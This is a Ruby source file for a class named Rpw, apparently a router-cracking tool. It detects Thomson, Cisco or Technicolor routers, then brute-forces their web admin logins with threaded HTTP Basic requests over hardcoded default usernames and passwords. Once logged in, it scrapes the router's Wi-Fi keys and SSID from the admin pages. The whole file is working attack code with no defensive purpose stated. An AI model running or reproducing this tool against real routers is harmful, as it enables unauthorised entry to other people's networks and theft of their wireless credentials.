

class Rpw
	
	def initialize(ip,port)
		@routerType=nil
		@ip=ip
		@port=port
		@active=test_connection()
		@user=""
		@passwd=""
		@isCrack=false
		@wifiPassword={}
		@ssid=""
	end
	def ssid
		@ssid
	end
	def wifiPassword
		@wifiPassword
	end
	def routerType
		@routerType
	end
	def isCrack
		@isCrack
	end
	def user
		@user
	end
	def passwd
		@passwd
	end
	def test_connection()
		begin 
		 	Timeout.timeout(2) do       

				if socket = TCPSocket.new(@ip, @port)
					return true
				end
			end
		rescue	Timeout::Error,Errno::ECONNREFUSED,Errno::EHOSTUNREACH,Errno::ECONNRESET,Errno::ENETUNREACH
			return false

		end
	end
	def detect(body_data)
		routers = {:thomson => "Thomson", :cisco => "Cisco ", :technicolor => "technicolor"}
		routers.each do |data, re|
			if body_data.match(re)
				@routerType=data
				return 
			end
		end

	end
	def crack(url="")
		password = ["Swe-ty65", 'RdET23-10', 'TmcCm-651', 'Ym9zV-05n', 'Uq-4GIt3M',"superman","admin"]
		user = ["admin","superman"]
		threads = []
		credential = []
		
		user.each do |user_name| 
			password.each  do |passwd|
				threads << Thread.new(user_name,passwd){|u,ps| credential << login_request(u,ps,url)}
				
				if(threads.size()%8 == 0 && threads.size() != 0)
					threads.each(&:join)
					threads=[]
				end
			end
		end
		threads.each(&:join)
		credential.each do |rta|
			if rta != false 
				if rta[:response].code == "200" || rta[:response].code == "301"
					@user=rta[:credential][:user]
					@passwd=rta[:credential][:password]
					@isCrack=true
					return rta
				end
			end
			
		end
		return false
	end
	def getHttp(url)
		uri = URI("http://#{@ip}:#{@port}#{url}")
		req = Net::HTTP::Get.new(uri.request_uri)
		req['Authorization']="Basic #{Base64.encode64("#{@user}:#{@passwd}")}"
		begin 
			res = Net::HTTP.start(uri.host, uri.port) {|http| http.request(req) }
		rescue Errno::ECONNRESET,Errno::ECONNREFUSED,Errno::ETIMEDOUT,EOFError
			return false
		end
		return res
	end 
	def login_request(user_name,passwd,url="")
		
		uri = URI("http://#{@ip}:#{@port}#{url}")
		req = Net::HTTP::Get.new(uri.request_uri)
		req['Authorization']="Basic #{Base64.encode64("#{user_name}:#{passwd}")}"
		begin 
			res = Net::HTTP.start(uri.host, uri.port) {|http| http.request(req) }
		rescue Errno::ECONNRESET,Errno::ECONNREFUSED,Errno::ETIMEDOUT,EOFError
			return false
		end
		return {:response => res,:credential  => {:user => user_name , :password =>  passwd}}
	end
	
	def getPasswordWifi(typeArray)
	  
		url=RouterFP.getKeyUrl(@routerType)
		
		getHttp(url)
		data=getHttp(url)
		ret=[]
		
		for type in typeArray
			regex=RouterFP.getRex(@routerType,type)
			if passwd=data.body.match(regex)
				ret << passwd[1]
			else
				ret << nil
			end
			@wifiPassword[type.upcase.to_sym]=ret[-1]
			
		end
		return ret
	end
	def getSsid()
		
		url=RouterFP.getSsidUrl(@routerType)
		data=getHttp(url)
		
		regex=RouterFP.getRex(@routerType,"ssid")
		if ssid=data.body.match(regex)
			@ssid=parseSSID(ssid[1])
		else
			@ssid=""
		end
	end
	def getSW(typeArray)
		url=RouterFP.getKeyUrl(@routerType)
		getHttp(url)
		data=getHttp(url)
		ret=[]
		for type in typeArray
			regex=RouterFP.getRex(@routerType,type)
			if passwd=data.body.match(regex)
				ret << passwd[1]
			else
				ret << nil
			end
			@wifiPassword[type.upcase.to_sym]=ret[-1]
			
		end
		regex=RouterFP.getRex(@routerType,"ssid")
		if ssid=data.body.match(regex)

			@ssid=parseSSID(ssid[1])
		else
			@ssid=""
		end

		return ret
	end
	def parseSSID(ssid)
		
		if ssid.nil?
			return ""
		end
		if ssid.size<3
			return ssid
		end
		if ssid[0..1]!="&#"
		    return ssid
		end
		ssid[0]=""
		ssid=ssid.split("#").map! {|i| i.to_i.chr}.join
		return ssid
	end
	def ip
		@ip
	end
	def port
		@port
	end
	def active
		@active
	end
end
  